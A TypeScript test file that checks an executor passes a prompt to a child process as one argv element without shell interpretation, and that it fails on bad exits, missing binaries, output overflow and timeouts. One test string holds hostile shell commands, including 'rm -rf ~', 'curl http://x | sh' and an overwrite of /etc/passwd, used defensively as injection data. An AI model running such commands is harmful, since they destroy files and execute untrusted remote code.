// Executor safety proof: the prompt — hostile shell metacharacters and all —
// reaches the child process as EXACTLY ONE argv element, with no shell
// interpretation (spawn shell:false). The stub executor is `node -e` printing
// its own process.argv back as JSON, so the test observes precisely what the
// OS handed the child.
import { describe, expect, it } from "vitest";
import {
  buildExecutorArgv,
  ExecutorError,
  runExecutor,
} from "../src/executor.js";

/** `node -e` stub that echoes its argv (past the -e script) back as JSON. */
const ECHO_ARGV: string[] = [
  process.execPath,
  "-e",
  "console.log(JSON.stringify(process.argv.slice(1)))",
  "{prompt}",
];

const HOSTILE_PROMPT =
  "Fix the bug; rm -rf ~ $(evil) `backdoor` && curl http://x | sh > /etc/passwd '\"";

describe("buildExecutorArgv", () => {
  it("replaces only elements that ARE the placeholder, as one element", () => {
    expect(buildExecutorArgv(["claude", "-p", "{prompt}"], "hi there")).toEqual([
      "claude",
      "-p",
      "hi there",
    ]);
  });

  it("appends the prompt when no placeholder is present", () => {
    expect(buildExecutorArgv(["claude", "-p"], "hi")).toEqual(["claude", "-p", "hi"]);
  });

  it("never splices the prompt into the middle of another element", () => {
    // "--flag={prompt}" is NOT the bare placeholder — it stays verbatim and
    // the prompt is appended instead (no partial-string interpolation).
    expect(buildExecutorArgv(["run", "--flag={prompt}"], "data")).toEqual([
      "run",
      "--flag={prompt}",
      "data",
    ]);
  });
});

describe("runExecutor", () => {
  it("passes shell metacharacters through as ONE uninterpreted argv element", async () => {
    const { stdout } = await runExecutor({
      argv: ECHO_ARGV,
      prompt: HOSTILE_PROMPT,
      timeoutMs: 30_000,
    });
    const argv = JSON.parse(stdout.toString("utf8")) as string[];
    // Exactly one argument, byte-for-byte the hostile prompt: `;`, `$( )`,
    // backticks, pipes, redirects, and quotes were data, not shell syntax.
    expect(argv).toEqual([HOSTILE_PROMPT]);
  });

  it("fails (does not resolve) on a non-zero exit code", async () => {
    await expect(
      runExecutor({
        argv: [process.execPath, "-e", "process.exit(3)", "{prompt}"],
        prompt: "x",
        timeoutMs: 30_000,
      }),
    ).rejects.toMatchObject({
      name: "ExecutorError",
      detail: { exitCode: 3, reason: "exit" },
    });
  });

  it("fails on spawn errors (missing binary)", async () => {
    await expect(
      runExecutor({
        argv: ["/definitely/not/a/real/binary-xyz", "{prompt}"],
        prompt: "x",
        timeoutMs: 30_000,
      }),
    ).rejects.toBeInstanceOf(ExecutorError);
  });

  it("kills and fails when stdout exceeds the byte cap", async () => {
    await expect(
      runExecutor({
        argv: [
          process.execPath,
          "-e",
          "const b=Buffer.alloc(65536,120);for(let i=0;i<32;i++)process.stdout.write(b);",
          "{prompt}",
        ],
        prompt: "x",
        timeoutMs: 30_000,
        maxStdoutBytes: 64 * 1024,
      }),
    ).rejects.toMatchObject({ detail: { reason: "stdout-overflow" } });
  });

  it("kills and fails on timeout", async () => {
    await expect(
      runExecutor({
        argv: [process.execPath, "-e", "setTimeout(()=>{}, 60000)", "{prompt}"],
        prompt: "x",
        timeoutMs: 250,
      }),
    ).rejects.toMatchObject({ detail: { reason: "timeout" } });
  });
});
